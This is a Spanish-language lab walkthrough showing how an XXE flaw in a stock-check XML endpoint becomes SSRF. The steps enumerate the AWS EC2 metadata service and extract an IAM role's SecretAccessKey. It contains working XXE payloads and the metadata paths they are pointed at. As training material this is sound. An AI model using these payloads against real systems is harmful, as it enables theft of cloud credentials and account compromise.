# 2. XXE para Ataques SSRF

## 🗄️ XXE para realizar ataques SSRF

### 📄 Descripción del laboratorio

Este laboratorio contiene una funcionalidad de **comprobación de existencias** que envía un documento **XML** al servidor.

El parser XML procesa la entrada sin restringir **entidades externas**, lo que permite explotar **XML External Entity (XXE)**.\
En este caso, la vulnerabilidad se utiliza no para leer archivos locales, sino para provocar **peticiones HTTP internas**, convirtiéndose en un **SSRF (Server-Side Request Forgery)**.

El servidor simula el servicio de metadatos de **AWS EC2 (IMDSv1)** disponible en:

```
http://169.254.169.254/
```

Este servicio solo es accesible desde la propia instancia y contiene información sensible, incluyendo **credenciales temporales del rol IAM**.

🎯 **El objetivo es:**

* Explotar XXE para provocar peticiones SSRF.
* Acceder al servicio de metadatos.
* Recuperar la **SecretAccessKey** del rol IAM.

***

### 📚 Teoría

Normalmente la vulnerabilidad **XXE** se utiliza para leer archivos locales mediante entidades externas como:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

Sin embargo, si el parser también permite entidades externas apuntando a **URLs HTTP**, la vulnerabilidad se convierte en una **primitiva SSRF completa**.

En este laboratorio:

* El parser XML permite entidades externas con `SYSTEM "http://..."`.
* El servidor puede acceder a **redes internas** inaccesibles para el atacante.
* La respuesta del recurso solicitado se refleja en la respuesta HTTP.

Esto permite utilizar el servidor vulnerable como **proxy hacia recursos internos**.

#### 📌 Servicio de metadatos de AWS EC2

El endpoint:

```
http://169.254.169.254/
```

expone información interna de la instancia EC2.

La información se organiza en una **estructura jerárquica**, por ejemplo:

* Información de red
* Identificadores de instancia
* Credenciales IAM temporales

En entornos reales, obtener estas credenciales puede permitir:

* Acceso a servicios AWS
* Manipulación de recursos cloud
* Compromiso completo de la cuenta según permisos del rol.

***

### 📝 Práctica

#### 🎯 Objetivo

Extraer la **SecretAccessKey** del rol IAM mediante SSRF provocado por XXE.

***

#### 1️⃣ Identificar el endpoint interno

La IP:

```
http://169.254.169.254/
```

es una **dirección link-local**, accesible únicamente desde la instancia.

Si se intenta acceder desde el navegador del atacante, no responde.

Sin embargo, el servidor vulnerable **sí puede acceder a ella**, lo que permite utilizarlo como intermediario.

***

#### 2️⃣ Confirmar SSRF mediante XXE

Interceptamos la petición **Check stock** con Burp Suite y la enviamos al **Repeater**.

Inyectamos una entidad externa apuntando a la raíz del servicio de metadatos:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

Enviamos la petición.

<figure><img src="../../../.gitbook/assets/image (466).png" alt=""><figcaption></figcaption></figure>

Respuesta del servidor:

```
latest
```

Esto confirma que:

* El parser XML realiza una petición HTTP interna.
* La vulnerabilidad **XXE → SSRF** funciona correctamente.

***

#### 3️⃣ Enumerar el servicio de metadatos

A continuación navegamos por el servicio modificando la URL de la entidad externa.

#### 📌 Nivel 1

```
http://169.254.169.254/latest
```

Respuesta:

```http
meta-data
```

***

#### 📌 Nivel 2

```
http://169.254.169.254/latest/meta-data/
```

Respuesta:

```
iam/
```

***

#### 📌 Nivel 3

```
http://169.254.169.254/latest/meta-data/iam/
```

Respuesta:

```
security-credentials/
```

***

#### 📌 Nivel 4

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Respuesta:

```
admin
```

Esto indica que existe un **rol IAM llamado `admin`**.

***

#### 4️⃣ Obtener las credenciales del rol

Construimos el payload final apuntando directamente al rol descubierto:

{% code overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```
{% endcode %}

Enviamos la petición.

<figure><img src="../../../.gitbook/assets/image (467).png" alt=""><figcaption></figcaption></figure>

***

#### 5️⃣ Exfiltrar la SecretAccessKey

El servidor devuelve un objeto JSON similar a:

```json
{
  "AccessKeyId": "ASIA....",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY....",
  "Token": "...",
  "Expiration": "..."
}
```

La **SecretAccessKey** aparece directamente en la respuesta.

Copiamos el valor solicitado por el laboratorio.

***

#### 6️⃣ Resultado final

Se consigue:

* Explotar la vulnerabilidad **XXE**.
* Forzar peticiones **SSRF internas**.
* Acceder al servicio de metadatos de EC2.
* Enumerar el rol IAM.
* Obtener la **SecretAccessKey**.

El laboratorio se completa correctamente.
